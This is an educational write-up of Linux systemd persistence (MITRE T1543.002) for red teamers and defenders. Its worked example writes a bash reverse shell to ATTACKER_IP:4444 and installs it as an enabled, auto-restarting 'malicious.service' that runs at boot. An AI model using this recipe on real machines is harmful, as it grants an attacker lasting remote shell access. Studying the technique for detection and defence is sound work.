# Systemd Service Persistence

## Overview

Systemd is the service manager used by most modern Linux distributions. It is responsible for starting, stopping, and managing system services during the boot process and throughout system operation.

Because systemd automatically launches configured services, it is frequently targeted as a persistence mechanism. By leveraging systemd, an attacker can ensure that a payload or backdoor is executed automatically when the system starts.

---

## Common Systemd Locations

### System-Wide Services

```text
/etc/systemd/system/

/usr/lib/systemd/system/

/lib/systemd/system/
```

These locations contain service definitions that affect the entire system.

---

### User Services

```text
~/.config/systemd/user/
```

Services stored here execute within the context of a specific user account.

---

## Service Components

A typical systemd service contains several key elements:

### Unit Section

Defines metadata and dependencies.

```text
[Unit]
Description=Service Description
After=network.target
```

### Service Section

Defines the process that will be executed.

```text
[Service]
ExecStart=/path/to/program
Restart=always
```

### Install Section

Determines when the service should start.

```text
[Install]
WantedBy=multi-user.target
```

---

## Common Abuse Scenarios

### Custom Service Creation

An attacker creates a new service that launches a persistent payload whenever the system starts.

### Service Modification

An existing service is modified to execute additional commands or programs.

### User-Level Persistence

A service is configured within a user's profile to execute automatically when that user logs in.

### Automatic Restart Abuse

A service is configured to restart automatically if terminated, helping maintain long-term access.

---

## Example: Creating a Systemd Service

The following example demonstrates how a systemd service can be configured by hacker to automatically execute a malicious script whenever the system boots.

### Step 1: Create the Script

Create a reverse shell script that will be executed by systemd.

```bash
mkdir -p /opt/scripts
```

```bash
nano /opt/scripts/reverse.sh

#!/bin/bash

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Make the script executable:

```bash
chmod +x /opt/scripts/reverse.sh
```

---

### Step 2: Create the Service Unit File

Create a service definition:

```text
/etc/systemd/system/malicious.service
```

Example content:

```ini
[Unit]
Description=Malicious Script Service
After=network.target

[Service]
Type=simple
ExecStart=/opt/scripts/reverse.sh
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

---

### Step 3: Reload Systemd Configuration

Reload systemd so it recognizes the new service:

```bash
sudo systemctl daemon-reload
```

---

### Step 4: Enable the Service

Enable the service so it automatically starts during system boot:

```bash
sudo systemctl enable malicious.service
```

---

### Step 5: Start the Service

Start the service immediately:

```bash
sudo systemctl start malicious.service
```

---

### Step 6: Verify Service Status

Confirm that the service is running:

```bash
sudo systemctl status malicious.service
```

Example output:

```text
● malicious.service - Malicious Script Service
   Loaded: loaded (/etc/systemd/system/malicious.service)
   Active: active (running)
```

---

## Service Execution Flow

```text
System Boot
     │
     ▼
Systemd Starts
     │
     ▼
malicious.service Loaded
     │
     ▼
ExecStart Invoked
     │
     ▼
reverse.sh Executes
     │
     ▼
Task Completed
```


---

## Related MITRE ATT&CK Technique

**T1543.002 – Create or Modify System Process: Systemd Service**

---

## Summary

Systemd services provide a reliable persistence mechanism on modern Linux systems. Because systemd is responsible for managing critical operating system processes and automatically starting services during boot, it offers a natural method for maintaining execution across reboots. Understanding how systemd manages services is essential for both red team operators and defenders analyzing Linux persistence techniques.
